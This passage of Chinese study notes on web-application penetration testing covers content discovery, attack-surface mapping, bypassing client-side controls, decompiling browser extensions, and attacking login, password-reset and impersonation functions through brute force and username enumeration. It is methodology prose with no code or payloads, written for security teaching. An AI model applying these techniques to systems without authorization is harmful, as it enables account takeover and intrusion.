手动提出一些访问有效与无效资源的请求，看服务器如何处理无效资源； 使用指导抓取生成的站点地图作为自动查找隐藏内容的基础； 针对基础应用程序内已知存在的每个目录或路径中常用的文件名和目录，自动发起请求；如果已经了解应用程序处理访问无效资源的处理方式，则可以配置 Intruder 等工具将其忽略； 收集从服务器返回的响应，手动检查这些响应以筛选出有效的资源； 反复执行这个过程，直到发现新内容； 通过公布的内容进行推测一般来说，应用程序会使用某种命名方案，因此可以配置抓取工具按照命名方案进行搜索，这样可以提高命中的效率； 渗透测试步骤 检查用户指定的浏览与基本蛮力测试获得的结果，包括所有子目录名称、文件词干、文件扩展名列表等； 检查这些列表，确定应用程序所使用的命名方案； 有时候，命名方案中会使用数字和日期作为标识符，因此根据历史文件的命名，可以猜测出公司的新文件的命名； 检查所有客户端代码，如HTML 和 Javascript，寻找与隐藏内容有关的蛛丝马迹，例如代码中的注释部分，经常放着一些重要的线索，有时候甚至有高度敏感的信息； 把已经枚举出来的内容和文件名扩展名添加的常用列表中，它们有可能会揭示应用程序所使用的开发语言和工具； 搜索开发者工具和文件编辑器不经意建立的临时文件，例如 .DS_Store 文件； 结合目录、文件词干、文件扩展名列表，再进一步执行自动搜索操作，发掘更多隐藏的信息； 如果找到了一种统一的命名方案，则可以在这个基础上，实施更有针对性的蛮力测试； 基于新找到内容和新发现的模式，作为用户指导抓取操作的基础，反复执行之前的步骤，继续执行自动内容查找； 上述的大部分动作可以在 Burp Intruder Pro 的内容查找功能中实现； 利用公共信息如果应用程序中的内容在历史上曾经跟其他内容有所连接的话，则可以通过搜索引擎、Web档案等第三方工具将这些连接找出来； 渗透测试步骤 使用多种不同的搜索引擎和Web档案工具，查找它们保存的关于所要攻击的应用程序的相关信息； 查询搜索引擎时，可以使用搜索引擎提供的一些便利功能来提高搜索效率，例如：site, link, related 等关键字； 每次搜索时，不仅查看搜索引擎提供的默认部分中的内容，还可以看一下群组、新闻等部分的内容； 如果有部分内容被搜索引擎省略，可以将它们纳入搜索范围后，重新搜索； 查看感兴趣页面的缓存版本，里面可能包含一些未经过验证就无法查看的信息； 在属于相同组织的其他域名上执行相同的查询； 一般来说，应用程序的开发人员，在开发过程中不可避免会遇到问题，并到一些论坛上面提问题和寻找答案，因此这些地方有可能会查到一些关于代码的信息； 渗透测试步骤 列出与待攻击应用程序相关的开发人员的姓名和邮件列表； 根据姓名查找他们在因特网上发表的所有问题和安全，分析发现的信息，了解与应用程序相关的线索； 利用 Web 服务器程序Web 服务器程序本身也是存在大量漏洞的，利用这些漏洞可以获得应用程序所有页面和其他资源；更有意思的是， Web 服务器程序一般会结合很多第三方工具来提供一些便捷的功能，这些模块都会有一些安装规律，因为可以加以利用，暴露出一些其他办法查找不到资源路径； Nikto 或者 Wikto 即是可以执行上述扫描功能的免费工具； 应用程序页面与功能路径基于 URL 的内容查找源于历史上的静态页面，现在很多服务端应用程序已经演变为以提供动态页面为主，经常在会参数中携带功能的名称，而不是在 URL 中显示，因此前面描述的那些方法不一定能够很好的发现所有的隐藏内容； 针对这种情况，渗透测试的步骤如下： 确定所有通过在参数中提交功能名称的情况 修改之前提到的 URL 内容查找自动化的配置，以便让它能够应对这种新的情况； 如果可能的话，根据功能路径画一张应用程序的内容图，找出被枚举的功能和逻辑路径之间的依赖关系； 发现隐藏的参数有时候开发人员会通过一些隐藏的参数来改变应用程序的行为，例如使用 debug 参数来开启或关闭调试功能； 渗透测试步骤： 使用常见参数和常用值，提交大量请求； 监控收到的全部响应，看增加的额外参数有没有让应用程序作出不一样的响应行为； 如果时间允许，可以对所有页面都执行以上动作；如果时间不允许，可以只测试一些重点的页面，例如登录、搜索、文件的上传和下载等； 分析应用程序在枚举完尽可能多的功能后，接下来是基于收集到的数据，进一步分析应用程序，以找到它的攻击面；值得分析的一些重要部分如下： 应用程序的核心功能； 应用程序的外围功能，例如错误消息、日志、重定向使用、站外链接等； 核心安全机制及其动作方式，特别是会话状态、访问控制、验证机制及其支持（例如用户注册、忘记密码、账户恢复等）； 应用程序处理用户提交的输入的所有位置，例如 URL、查询字符串、POST 数据等； 客户端使用的技术，例如表单、客户端脚本、厚客户端组件等； 服务端使用的技术，例如静态与动态页面、请求参数类型、SSL、Web服务器软件、数据库交互、电子邮件系统等后端组件； 其他任何可收集到的，关于服务器应用程序内部结构与功能的其他信息，例如后台传输机制等； 确定用户输入的入口点输入的常见位置如下： 每个 URL 字符串，例如：REST 风格的应用程序； URL 查询字符串中提交的每个参数； POST 请求主体中提交的每个参数； 每个 cookie 的键值对； 极少数情况下还包括消息头中的一些字段，例如 User-Agent、Referer、Accept、Accept-Language、Host等； URL 文件路径此时的输入体现在 REST 风格的路径中，至于命名是否有统一的标准，主要取决于开发者； 请求参数一般来说，在查询字符串的请求参数、POST 参数和 cookie 键值对中，都含有明显的输入，但是它们的格式不一定是标准的 key&#x3D;value 格式，有些开发者会使用一些定制的模式，需要加以留意一下； HTTP 消息头很多应用程序会使用日志的功能，会去读取 Referer 和 User-Agent 字段里面的值，因此这些消息头也有可能成为入口点； 有些应用程序还会处理消息头里面的值，记录和提取关于用户的一些信息，然后做出不同的响应；例如根据用户访问使用的不同设备、根据 IP 进行定位等； 应用程序的这些功能都增加了 SQL 注入或持续的跨站点脚本等攻击； 带外通道在探测的过程中，服务端的结果有时并一定会通过响应进行返回，此时就需要有额外的通道能够查询到这些响应； 确定服务器端技术提取版本信息例如响应中的 Server 消息头；其他可能揭露服务相关软件信息的有 建立 HTML 页面的模板； 定制的 HTTP 消息头； URL 查询字符串参数； HTTP 指纹识别虽然服务端可能会在 Server 消息头中对自己的身份进行伪造，但是应用程序中仍然会有很多蛛丝马迹可以用来推测服务端会使用的软件，也有相应的工具，例如 httprecon 等； 文件扩展名常用的文件扩展名 asp: Microsoft Active Server Pages; aspx: ASP.NET jsp: Java php: PHP 即使页面没有体现出扩展名，也可以通过请求一个不存在的文件，从返回的错误页面也可能可以得到相关信息； 目录名称一些子目录名称也可用来确认是否使用相关技术； servlet：Java servlet； pls: Oracle PL&#x2F;SQL 网关 rails: Ruby on Rails 会话令牌会话令牌的名称也会揭示信息 JESSIONID: Java ASPSESSIONID: Microsoft IIS 服务器 ASP.NET_SessionId： ASP.NET PHPSESSID: PHP 第三方代码组件很多应用程序会整合一些第三方代码组件来执行一些常见的功能，例如购物车、登录机制等；这些组件可能为开源代码，或者从其他公司购买来的，不管是哪一种，都意味着这些组件会被很多人使用； 因此，软件中很可能包含其他地方已经揭示的某些已知漏洞，攻击者还可以下载这些组件的开源代码进行分析，在找到可能的漏洞； 渗透测试步骤 确定全部用户输入入口点； 分析应用程序所使用的查询字符串格式，设法了解键值对的名称规律； 确定应用程序可能使用的一些第三方数据的带外通道； 查看响应中的 Server 属性； 检查所有 HTTP 消息头或 HTML 注释中包含的其他软件标识； 运行 Httprecon 工具来识别服务器； 如果获得了 Web 服务器软件名称和版本，则可以搜索可供利用的所有漏洞； 分析应用程序的 URL 列表，从扩展名和子目录名中查找线索； 分析会话令牌的名称； 使用常用技术列表或 Google 推测服务器所使用的技术； 在 Google 上搜索第三方组件可能使用的不常用的 cookie、脚本、HTTP 消息头名称；确定所使用的是哪种第三方组件，下载安装组件，分析其中可能存在的漏洞； 确定服务器端功能仔细分析请求请求中的各种参数暗含着很多信息量，包括资源的类型、可执行的操作、资源的编号、是否使用数据库、服务器的语言框架等； 推测应用程序的行为应用程序可能会执行某种输入确认检查，以净化可能存在的恶意输入；如果它有将错误揭示反馈到浏览器，则可以用来判断应该提交哪些输入，才有可能通过检查，之后设计特定字符串来规避检查； 隔离独特的应用程序行为有时，许多可靠的应用程序会使用一致的框架来防范各种类型的攻击，此时薄弱点经常出现在开发人员后续添加的而常规安全框架没有处理的那些功能；一般来说，通过 GUI 外观、参数命名约定，或者源代码中的注释，即可找出这些拼接的功能； 渗透测试步骤 记录其使用的标准 GUI 外观、参数命名或导航机制与应用程序的其他部分不同的任何功能； 记录可能在后续添加的功能，包括调试功能、CAPTCHA 控件、使用情况跟踪和第三方代码等； 对这些区域进行全面检查，这些区域很可能没有其他区域实施的标准防御机制； 解析受攻击面常用的易受攻击的漏洞： 客户端确认：服务器没有采用确认检查； 数据库交互：SQL 注入； 文件上传与下载：路径遍历漏洞、保存型跨站点脚本； 显示用户提交的数据：跨站点脚本； 动态重定向：重定向与消息头注入攻击； 社交网络功能：用户名枚举、保存型跨站点脚本； 登录：用户名枚举、脆弱密码、可使用蛮力； 多阶段登录：登录缺陷； 会话状态：可推测出的令牌、令牌处理不安全； 访问控制：水平权限和垂直权限提升； 用户伪装功能：权限提升； 使用明文通信：会话劫持、收集证书和其他敏感数据； 站外链接：Referer 消息头中查询字符串参数泄露； 外部系统接口：处理会话与访问控制的快捷方式； 错误消息：令牌泄露； 电子邮件交互：电子邮件与命令注入； 本地代码组件或交互：缓冲区溢出； 使用第三方应用程序组件：已知漏洞； 已确认的Web 服务器软件：常见配置薄弱环节、已知软件程序缺陷； 解析 EIS 应用程序 了解应用程序的核心功能和使用的主要安全机制； 确定通常与常见漏洞有关的应用程序功能和行为特点； 在公共漏洞数据库（如 www.osvdb.org）中检查任何第三方代码，以确定任何已知问题； 制订攻击计划，优先考虑最可能包含漏洞的功能，以及最严重的漏洞； 小结虽然直接发动攻击显得很有吸引力，但在行动之前，先做一番分析的工作，将使得攻击的效率大大提高；一般来说，在采用手动技巧的同时，适当的采用自动化工具，是最有效的攻击手段； 5. 避开客户端控件通过客户端传送数据一般来说如果将会话数据放在服务器端，安全性更高一些，但是当在很多台服务器同时部署应用程序时，解决它们之间的数据同步将是一个挑战，因此有时候开发人员会将会话数据前移到客户端，这样确实让事情变得简单了，但是却增加了风险； 隐藏表单字段应用程序将部分信息保存在隐藏的表单字段中，之后和用户填写的其他表单字段一起提交； HTTP cookie应用程序将信息保存在 cookie 的键值对中，之后在客户端发起请求时，一起发到服务端； URL 参数将参数保存在 URL 中是最容易被用户修改的情况了； Referer 消息头有些开发者使用这个字段来判断某个请求是由哪个 URL 触发的； 模糊数据有时候服务端发到客户端的数据并不是明文的，而是经过了一定的模糊化处理，然后等客户端提交回服务端时，再解密去模糊； ASP.NET ViewState它是一种通过客户端传送模糊数据的常用机制，使用一些隐藏的字段保存一些序列化后的数据； 但是 ASP.NET 默认会开启对 ViewState 字段的保护，通过加盐进行散列化，用来防止客户端的窜改，但有些应用程序会将保护关掉，这个时候就会产生漏洞了；一个页面开启保护，不代表所有页面都开启，因此需要逐一排查； 收集用户数据：HTML 表单长度限制这个可以轻意绕过，只能用来限制非专业的用户；可以故意给相关的字段设置一个超过长度的值，然后看服务端是否有所反应，如果能够通过验证，则说明服务器端没有再做一次验证，存在漏洞； 基于脚本的确认跟前面的长度限制一样，略； 禁用的元素浏览器在提交请求时，并不会包含禁用的元素，因此仅仅观察发出的请求是无法找到这些元素的；但在查看页面源代码或者服务器的响应时，就会发现它们； 收集用户数据：浏览器扩展相对于 HTML 表单和 Javascript 脚本，使用浏览器扩展相对更不透明一些，这让开发人员有一种错觉，即扩展更加安全，但其实并非如此，通过检查扩展的漏洞经常可以收获很大； 常见的浏览器扩展技术 Java applet Flash Silverlight 它们有一些共同点，例如都编译成字节码、在提供沙盒环境的虚拟机中运行、可以使用远程框架，通过序列化来传输复杂的数据结构； 攻击浏览器扩展的方法 拦截并修改浏览器扩展提出的请求及服务器的响应； 直接针对组件实施攻击，并尝试反编译它的字节码，以查看它的源代码； 拦截浏览器扩展的流量如果扩展是明文传输数据，则简单好办，但有时候并非如此，以下是一些常见的问题： 处理序列化数据一般来说，每种浏览器扩展都会有一套序列化的方案，研究这些方案的特点，有针对性的进行解析处理； Java 序列化它会在在 Content-Type 里面体现为 application&#x2F;x-java-serialized-object, Burp Suite 中有一个插件 Dser 可用来查看拦截的序列化 Java 对象； Flash 序列化Content-Type: application&#x2F;x-amf Silverlight 序列化Content-Type: application&#x2F;soap+msbin1 拦截浏览器扩展流量时遇到的障碍问题1：扩展没有执行在浏览器中设置的代理原因在于客户端组件没有使用浏览器的 API 来发出 HTTP 请求，此时可以通过修改 hosts 文件来达到拦截目的，同时将代理服务器配置为劫持匿名代理，并自动重定向的正确的目标主机； 问题2：扩展可能不接受拦截代理器提供的 SSL 证书原因在于组件配置为不接受自签名的证书，或者组件本身的编码要求拒绝不可信的证书，此时可以通过在机器上面安装一个 CA 证书，并将代理服务器配置为使用该证书； 问题3：扩展使用除 HTTP 以外的协议进行通信原因在于拦截代理服务器可能无法处理这些协议；使用网络嗅探器例如 Echo Mirage 来修改相关流量，它通过注入进程并拦截套按字 API 调用来实现查看和修改数据的目的； 渗透测试步骤 确保代理服务器能够正确拦截浏览器扩展发出的所有流量；如有必要，使用嗅探器确定任何未正确拦截的流量； 如果扩展使用标准的序列化框架，确保拥有解压并修改序列化数据所需的工具；如果扩展使用专用编码或加密机制，则需要调试组件，对其进行全面测试； 检查服务器返回的能够触发客户端关键步骤的响应；一般来说，通过修改这个响应，能够解锁客户端的GUI，从而发现并执行那些复杂或多步骤的操作； 如果一些关键步骤（如赌博应用中的发牌动作）不是由客户端执行，而是由服务端执行，则尝试寻找执行该步骤和服务端通信之间的联系 反编译浏览器扩展在应对浏览器扩展时，对其进行反编译是最彻底的方法；一般来说，根据各自语言的特性，组件是以字节码的形式存在的，有时还会有反编码的防御机制，尽管如此，仍然是很有可能破解的； 下载字节码一般来说，字节码通过页面源文件中的 或 标签进行加载，里面有供下载的 URL；有时是通过脚本进行加载，此时可以等页面加载完毕后，再查看代理服务器的历史记录中的 URL； 由于字节码在加载后会被缓存，因为有时需要通过清理缓存来触发再次加载；另外拦截器有时会隐藏一些它认为不重要的信息，此时需要全部显示出来才找得到； 反编译字节码字节码经常以压缩包的形式被下载，因此需要先进行解压缩；Java 的 jar 包，Silverlight 的 .xap 文件，都是使用 zip 格式压缩的，此时只需给文件增加 zip 的后缀，即可以使用 zip 软件进行解压缩； 常用的反编译工具 Java：Jad Flash：Flasm，Flare，SWFScan； Silverlight：NET Reflector； 分析源代码重点分析的事项： 客户端输入确认或其他与安全相关的逻辑和事件； 在提交数据到服务端前，对数据进行加密或者模糊的函数； 在用户界面中看不到，但可以使用的隐藏功能； 在解析服务端时没发现，但在组件中引用的服务端功能； 修改组件行为的方法 修改源代码后，重新编译为字节码，清理缓存，重新下载字节码，之后用拦截器进行替换； 修改源代码后，重新编译为字节码，使用它计算出结果，导出到本地，用代理服务器将该结果提交到服务器； 使用 Javascript 操纵原始组件有时并不需要修改组件的字节码，而是基于组件的方法可能会被 javascript 调用，然后返回处理结果；此时，只需要修改 javascript 就可以实现修改结果的目的； 渗透测试步骤 下载、解压字节码，反编译成源代码； 查看源代码，了解组件的工作过程； 如果组件包含公共的方法，拦截与该组件交互的 HTML 响应，添加或修改 Javacript，获取想要的结果； 如果组件不包含公共的方法，修改组件的源代码，重新编译为字节码，独立执行这些字节码，获取想要的结果； 如果组件负责向服务端提交模糊或加密的数据，则可以设计一些特定的字符串，通过组件提交，用来探查服务端可能存在的漏洞； 字节码模糊处理为了应对反编译，人们会使用一些模糊技巧，让反编译后的结果难以被理解，或者增加理解的难度；常用的反编译技巧如下： 用没有意义的表达式替代有意义的类、方法、成员变量名称； 用保留的关键字替换项目名称； 删除字节码中不必要的调试和元信息，例如源文件名、行号、局部变量名、内部类信息； 增加多余的代码； 使用跳转指令对整个代码的执行路径进行修改，令人难以理解和判断执行代码的逻辑顺序； 在字节码中引入非法代码，如果不清除这些非法代码，则无法重新编译； 渗透测试步骤 不必完全理解源代码，只需确定是否包含公共方法，以及哪些方法可以从 javascript 进行调用，它们的签名是什么； 如果使用了无意义的表达式，则可以使用 IDE 内置的重构功能（如 rename），为其分配有意义的名称； 对已经模糊处理过的字节码，使用模糊处理工具，再次对其进行模糊处理，这样可以撤销许多模糊处理，例如 Jode 工具，它可用来删除由其他模糊处理工具添加的多余代码，并为数据分配唯一的名称，为理解模糊后的结果提供线索； 附加调试器有时组件很大，代码很多行，阅读它们很费时间，此时可考虑使用另外一种方法，即调试器；由于组件是在字节码级别运行的，因此用调试器在运行过程中跟踪变量，加入断点，查看和修改参数或变量，获取想要的结果，例如 javaSnoop； 本地客户端组件本地客户端组件不是基于字节码来运行，而是基于机器语言和汇编，因此它们的反编译工作稍微复杂一些（即逆向工程领域），不过原理仍然是一样的，即使用调试工具和添加断点，来分析程序的行为规律； 常用工具有：OllyDbg，IDA Pro等； 安全处理客户端数据通过客户端传送数据理论上，所有的数据服务端都是有的，因此，应该尽可能避免将敏感数据交给客户端提交，因为客户端是不可控的； 如果实在迫不得已，则应该将敏感数据和其他数据进行组合，然后加密，再发送到客户端，而不能仅单独加密敏感数据； 确认客户端生成的数据由于客户端被用户完全控制，因此在客户端对数据进行确认在理论上是几乎不可能的，只是难度大小的区别而已； 唯一安全的方法是永远不信任客户端，对客户端提交的每一项数据，都进行确认和验证； 日志与警报服务端有必要增加警报机制，在收到非法数据后，记录到日志中，向应用程序管理员发出警报，以便其能够监控攻击企图；同时应用程序还应该主动采取防御措施，终止用户会话或者暂时冻结其账户； 小结永远不要相信客户端的输入； 6. 攻击验证机制验证技术常用的验证技术 基于 HTML 表单的验证 多元机制，如密码+物理令牌； 客户端 SSL 证书或智能卡； HTTP 基本和摘要验证； 使用 NTLM 或 Kerberos 整合 Windows 验证； 第三方验证服务 验证机制设计缺陷密码保密性不强主要源于没有控制密码的强度；例如： 非常短或空白的密码； 以常用的字典词汇或名称为密码； 密码和用户名完全相同； 仍然使用默认密码； 渗透测试步骤 设法查明任何与密码强度有关的规则 浏览站点，查找规则的描述； 如果可以自行注册，用不同种类的脆弱密码注册一下，了解规则； 如果已经有账户，尝试把密码更改为弱密码； 蛮力攻击登录如果应用程序没有限制用户尝试的次数，则攻击者很容易就会使用蛮力攻击，因为有太多知名站点的沦陷，导致大量的用户密码泄露，它们都可以作为很好的密码库进行暴力尝试； 管理员密码经常更加脆弱，因为它常常是在应用程序上线之前就已经设置好的，因此经常没有遵守规则； 有些应用程序会在客户端使用隐藏字段记录尝试失败的次数，然后提交到服务器进行限制，但这种方法太容易被绕开；如果失败次数保留在服务端，也可以通过新开一个会话来绕过这个限制； 有些应用程序会在失败一定次数后锁定账户，让其不能登录，但是它可能仍然对后续的尝试做出正确与否的响应，此时攻击者只要不断尝试，直到找到正确的密码，然后等到解锁的时候，即可登录； 渗透测试步骤 用某个受控账户手动提交几个错误的登录尝试，监控接收到的错误消息； 如果在10次登录失败后，还没有返回锁定消息，再尝试正确的密码，如果登录成功，则说明应用程序并没有采取任何账户锁定策略； 如果账户被锁定，可以尝试使用不同的账户； 如果应用程序发布 cookie，则设置让每个 cookie 只使用一次，之后每次登录尝试获取新 cookie； 如果账户被锁定，应该查看与提交无效密码相比，提交正确密码是否会在响应中存在差异；如果是的话，则即使账户被锁定，仍然可以继续猜测攻击； 如果没有受控账户，尝试枚举一个有效的用户名，并使用它提交几次错误登录，监控账户的错误消息； 发动蛮力攻击前，应先确定好应用程序在成功与失败两种响应的差异，以便分清区别； 列出常见的用户名和密码列表，根据已知的密码规则对其进行过滤，只留下有效的密码，避免无谓的多余尝试； 使用这些用户名和密码的排列组合，使用适当的工具或定制脚本迅速生成登录请求，监控服务器的响应，筛选出那些成功的登录尝试； 如果一次针对几个用户名，最好使用广度优先，而不是深度优先，每个用户名只尝试一次密码，然后轮下一个用户名，这样避免触发单个用户名的失败次数过多的锁定； 详细的失败消息失败消息中，有时候会注明是哪一项登录消息无效，例如用户名或者密码，此时就可以利用这个信息，筛选出有效的用户名，供下一轮攻击时使用； 如果应用程序允许用户自行注册并指定自己的用户名，由于应用程序需要排查用户名是否重复，因此攻击者可以利用这一点进行用户名枚举，筛选出有效的用户名； 有些应用程序的登录比较复杂，需要用户提交几组信息，或者分几个步骤，此时详细的失败信息有助于攻击者轮流针对登录过程的每个阶段发动攻击； 同样的用户名错误，页面上可能看起来没有差别，但在 HTML 源代码中可能会有区别，通过“比较”工具找出区别，就可以收获有效的信息； 渗透测试步骤 如果已经有一个受控账户，使用这个账户的用户名和一个错误的密码登录一次，然后使用完全随机的用户名进行另一次登录； 记录两次登录服务器响应中的每一个细节，包括状态码、重定向、屏幕上显示的信息、页面源代码的差异；使用拦截器保存请求和响应的完整历史记录； 努力找出两次尝试间的任何明显或细微的差异； 如果找不到差异，在应用程序中任何提交用户名的地方重复上述操作，例如注册、密码修改、忘记密码等功能； 如果发现有差异，使用一个常见的用户名列表，用自动工具迅速提交每个用户名，根据响应的差异，筛选出有效的用户名； 开始枚举之前，确定应用程序是否有失败次数达到上限后的锁定策略；如果有，则不应该在枚举时使用不合理的密码，而应提交常见的密码； 即使服务端对有效用户名和无效用户名返回的响应完全相同，它的处理时间也经常是不同的，即有效用户名处理的步骤可能要久一些，而无效用户名要短一些；这种判断方法不一定百分百准确，但从大数来说，有一定的准确概率； 除了登录功能外，还可以从其他地方获取有效的用户名，例如源代码注释、开发人员的电子邮件、可访问的日志等； 密码传输易受攻击如果应用程序使用非加密的 HTTP 连接传输登录密码，处于网络中适当位置的窃听者就有机会能够拦截这些密码；可能窃听的位置有： 用户的本地网络中； 用户的 IT 部门中； 用户的 ISP 内； 因特网骨干网上； 托管应用程序的 ISP 内； 管理应用的 IT 部门内； 即使通过 HTTPS 登录，应用程序也有可能使用不安全的方式来处理密码，导致密码可能被泄露： 以查询字符串而不是 POST 请求主体中传送密码；这样会导致很多地方都会记录这些信息，例如用户的浏览历史记录、Web服务器日志内、主机基础架构使用的任何反向代理中；如果攻击者能够攻击这些资源，就有机会获得密码； 虽然多数应用开发者使用 POST 提交表单，但登录请求却经常使用 302 重定向到一个不同的 URL 来进行； 有些开发者会将密码保存在 cookie 中，此时攻击者可以通过访问客户端的本地文件系统来获得密码；即使密码被加密也没有关系，直接放入 cookie 中就可以用了； 有些应用程序在加载第一个页面时没有使用 HTTPS，而是等到了传输密码时，才使用 HTTPS，这样是有安全隐患的，即用户无法保证第一个加载到的页面是真实的； 渗透测试步骤 进行一次成功登录，监控客户端与服务器之间的所有来回流量； 确定在来回方向传输密码的每一种情况，可通过设置拦截规则，标记包含特殊字符串的信息； 如果发现客户端通过 URL 查询字符串或cookie提交密码，或者由服务端向客户端传输密码，则需要了解其这样做的目的； 查看是否通过非加密渠道传输任何敏感信息； 如果没有发现不安全传输密码的情况，留意任何明显或模糊处理的数据，如果这些数据中包括敏感数据，则可能逆向工程其模糊算法； 例如使用 HTTPS 提交密码，但使用 HTTP 加载登录表单，则有机会使用中间人攻击，通过钓鱼获取密码； 密码修改功能很多 Web 应用程序的密码修改功能经常不需要验证就可以访问，并经常给攻击者提供一些重要的信息，例如： 过于详细的错误消息，例如说明被请求的用户名是否有效； 允许攻击者无限制猜测现有密码字段； 在验证现有密码后，仅检查“新密码”与“确认新密码”字段的值是否相同，允许攻击者不需入侵即可成功确认现有密码是否正确； 渗透测试步骤 发现和确定应用程序中的所有密码修改功能；有时候它可能是隐藏的； 使用无效的用户名、无效的现有密码及不匹配的“新密码”和“确认新密码”等值，向密码修改功能提交各种请求； 设法确定任何可用于用户名枚举或蛮力攻击的行为； 提示：有时候表面看起来可能没有用户名字段，但它很可能是放在隐藏表单字段中；如果表单字段中也没有，可以尝试使用跟登录功能相同的参数提交一个包含用户名的参数（它有时可以成功覆盖当前用户的用户名，获得向其他用户发起蛮力攻击的机会，即使在主登录页面可能实施不了这个攻击）； 忘记密码功能同密码修改功能一样，忘记密码功能经常也会引入枚举漏洞，原因如下： 使用质询问题：通过社交网络或其他渠道，可能很容易获取这些质询的答案，它的答案范围比正常的密码范围要小得多； 没有为质询的回答次数进行限制； 使用密码暗示：由于普通用户缺少安全意识，留下的暗示经常相当于明示；另外还可以通过已存在的问题暗示库数据进行枚举破解； 通过质询后，告知旧密码；导致攻击者只要记下质询的答案，即使用户修改了密码后，仍然可以通过质询获得新密码； 通过质询后，跳转到一个无须验证的新会话，导致攻击者即使不知道密码，也马上可以使用该账户了； 通过质询后，将恢复的 URL 发送至质询过程中提供的邮箱，而不是早期注册时预留的邮箱；（有时候邮箱字段并不在界面上显示，而是放在一个隐藏的表单字段或cookie中）； 修改密码后没有给用户发通知，导致用户误以为自己修改了密码，然后重新设置密码，最终无法发现账户已经被攻破了； 渗透测试步骤 确认应用程序中的所有忘记密码功能；即使公布的页面中没有这个链接，但很可能仍然有这个功能； 使用受控账户执行一次完整的密码恢复流程，了解其工作机制； 如果恢复机制使用了质询，确定一下是否是让用户自行设定质询和响应，如果是的话，则可以使用质询库来进行匹配； 如果恢复机制使用暗示，使用已公开的暗示库，选择那些最容易猜测的暗示进行攻击； 尽量找出忘记密码机制中任何可用于用户名枚举或蛮力攻击的行为； 如果应用程序使用发送恢复 URL 的机制，则收集尽可能多的这类 URL ，然后找出规律，预测向其他用户发布 URL 的模式（可使用分析会话令牌相同的技巧）； “记住我”功能常见漏洞 在 cookie 中存放用户名，然后服务端简单相信该 cookie，没有进行验证； 在 cookie 中存放的会话标识没加密，此时可以通过推断其他用户的会话标识进行登录尝试； 在 cookie 中存放的会话标识有加密，此时可以尝试通过跨脚点脚本的漏洞获取这些标识； 渗透测试步骤 激活所有”记住我”功能，确定应用程序是否记住了用户名和密码，还是只记了用户名，之后仍然需要输入密码；如果是后者，则此功能可能没有太大的漏洞； 仔细检查 cookie 值以及其他在本地存储的数据，寻找其中可能标识出用户或明显包含可预测用户标识的数据； 即使其中保存的数据经过了加密或模糊处理，通过比较几个非常类似的用户或密码的结果，有可能可以找到逆向工程的机会； 尝试修改持久性 cookie 的值，让服务端认为有另外一名用户在客户端登录过； 用户伪装功能一些应用程序允许特权用户伪装成普通用户，然后以该用户的权限访问数据和执行操作，例如银行或电信客户，在获得用户的电话口头验证后，切换到用户账户权限进行操作；常见的设计缺陷如下： 伪装功能可能通过“隐藏”的形式执行，且不受常规访问控制的管理，只要猜出 URL 即可访问使用； 服务端可能会信任当前有效 cookie 提交的任何数据，并切换到伪装账户的权限进行操作； 如果管理员也可以被伪装，则任何缺陷都可能导致垂直权限提升的漏洞，导致攻击不仅可以访问其他用户的数据，还可以控制整个应用程序； 有些伪装功能能够以“后门”密码（或者叫万能密码）进行执行；攻击者可以在实施标准攻击的过程中，通过枚举发现这个密码 渗透测试步骤 确定应用程序中的所有伪装功能，即使公布的内容中没有明确的伪装功能链接； 尝试使用伪装功能伪装成其他用户； 设法操纵由伪装功能处理的用户提交的数据，尝试伪装成其他用户，特别留意任何不通过正常登录页面提交用户名的情况； 如果能够成功利用伪装功能，尝试伪装成任何已知的或猜测出的管理用户，以提交用户权限； 实施密码猜测攻击时，查看是否有用户使用多个有效密码，或者某个特殊的密码是否与几个用户名匹配；特别注意任何 “以 X 登录”的状态消息；用在蛮力攻击中获得的密码，以许多不同的用户登录，检查是否一切正常； 密码确认不完善应用程序对密码的要求会显著影响密码池的大小，攻击者通过对密码限制进行分析，可以删除密码库中不符合条件的密码，从而加快了枚举的速度； 渗透测试步骤 使用一个受控账户，尝试使用密码的各种变化形式进行登录，例如删除最后一个字符、改变字符大小写、删除任何特殊排版的字符，以了解完整的密码确认规则； 利用规则，调整自动攻击的配置，删除多余的密码，提高成功的效率； 非唯一性用户名非唯一性用户名还是比较少见的，可以通过多次使用同一用户名注册，来判断是否有唯一性的限制； 如果存在唯一性的限制，则可以通过大量注册常见的用户名，来获取哪些用户名是有人在用的； 渗透测试步骤 如果应用程序允许自我注册，尝试用不同密码两次注册同一个用户名； 如果应用程序不允许用户名重复，则可以用常见的用户名反复注册，以找到已注册的用户名； 如果应用程序允许用户名重复，尝试使用相同的密码，注册两个相同用户名，看应用程序会如何反应； 如果报错，使用某个有效的用户名，则尝试使用一组常用密码多次注册该用户名，如果应用程序拒绝某个特殊的密码，则可以发现用户名的现有密码； 如果没有报错，使用指定的密码登录，看看出现了什么结果；此时需要在每个账户中保存不同的数据以进行区分，之后才能确定这种行为是否可以导致跨账户的权限； 可预测的用户名有些应用程序根据某种可以预测的顺序自动生成账户用户名，在找到规律后，即可以很快获得全部的有效用户名； 可预测的初始密码一些应用程序一次性或大批量创建用户，并自动指定初始密码，然后分配给所有用户； 渗透测试步骤 设法获得几个连续的密码，看能否从中看出任何顺序规律； 如果有规律，根据规律，获取其他应用程序用户的密码； 如果密码看起来跟用户名关联，使用已知的用户名或猜测出的用户名，用推断出的密码尝试进行登录验证； 可以使用推断出的密码列表作为后续实施蛮力攻击的基础； 密码分配不安全由于人性懒惰，如果应用程序没有要求用户修改初始密码，则大部分用户都不会更改初始密码； 有些应用程序不分配密码，而是发送一个激活链接，用户点击后，开始设置初始密码；这个链接很可能存在某种规律，攻击者可以通过注册几个紧密相连的用户，来确定其中的规律； 有些应用程序更搞笑，在用户修改密码后，还会发一封邮件通知用户该新设置的密码是多少； 渗透测试步骤 获得一个新账户，如果应用程序没有要求在注册阶段设置密码，则需要弄清应用程序如何分配密码； 如果应用程序使用激活 URL，则尝试注册几个紧密相关的新账户，从中寻找 URL 存在的规律；找到规律后，尝试使用这些 URL 占领其他用户的账户； 尝试多次重复使用同一个激活 URL，看应用程序如何反应；如果被拒绝，则尝试输入多次的错误密码，将受控账户锁定，然后重复使用 URL，看是否可行； 验证机制执行缺陷故障开放登录机制当验证不通过时，服务端的处理可能存在缺陷，例如错误的用户密码仍然可以登录，只是没有完整的功能，这样会导致一些数据泄露； 渗透测试步骤 使用受控账户执行一次完整、有效的登录；使用拦截器记录提交的每一份数据，收到的每一个响应； 多次重复登录过程，以非常规方式修改提交的数据；包括：提交一个空字符串值、完全删除键值对、提交非常长和非常短的值、提交字符串代替数字或反过来、以相同和不同的值多次提高同一个数据项； 仔细检查服务器对每次畸形请求的响应，确定任何不同于基本情况的差异； 